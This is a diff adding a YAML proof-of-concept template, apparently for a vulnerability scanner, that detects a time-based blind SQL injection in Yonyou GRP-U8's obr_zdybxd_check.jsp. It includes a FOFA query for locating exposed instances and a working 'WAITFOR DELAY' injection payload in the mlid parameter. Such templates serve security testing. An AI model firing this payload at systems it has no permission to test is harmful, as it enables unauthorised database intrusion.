@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-grp-u8-obr-zdybxd-check-jsp-sqli
+info:
+  name: 用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"GRP-U8")
+- method: GET
+  path: /u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: status_code == 200 && !contains(body,"<") && duration >= t1 && duration
+    < t2
+transport: http
